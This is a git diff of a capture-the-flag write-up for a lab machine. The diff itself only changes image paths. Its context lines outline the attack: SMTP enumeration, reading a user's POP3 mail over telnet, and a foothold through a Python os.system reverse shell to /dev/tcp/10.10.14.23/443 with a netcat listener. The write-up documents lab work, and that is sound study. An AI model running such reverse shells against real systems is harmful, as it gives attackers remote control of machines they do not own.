@@ -74,7 +74,7 @@ Nmap done: 1 IP address (1 host up) scanned in 137.18 seconds
 
 - This doesn't tell us very much. But it does give the SMTP server version (2.3.2)
 
-![](../../Assets/banner_grab.png)
+![](Assets/banner_grab.png)
 
 ### Enumerate SMTP
 
@@ -137,9 +137,9 @@ Nmap done: 1 IP address (1 host up) scanned in 10.28 seconds
 - We login to the pop3 server using `telnet 10.10.10.51 110` and get in as Mindy. 
 - Then we list her emails, and take a look.
 
-![](../../Assets/pop3_1.png)
+![](Assets/pop3_1.png)
 
-![](../../Assets/pop3_2.png)
+![](Assets/pop3_2.png)
 
 ## Foothold
 
@@ -173,7 +173,7 @@ os.system('bash -c "bash -i >& /dev/tcp/10.10.14.23/443 0>&1"')
 - This will initiate a reverse shell to my listener every time the `tmp.py` script is run.
 - On the attacking machine, I'll run a netcat listener on port 443, to capture any incoming requests.
 
-![](../../Assets/root.png)
+![](Assets/root.png)
 
 # Findings
 
@@ -228,6 +228,6 @@ Password for mindy reset
 
 # Proof
 
-![](../../Assets/user_flag.png)
+![](Assets/user_flag.png)
 
-![](../../Assets/root_flag.png)
+![](Assets/root_flag.png)
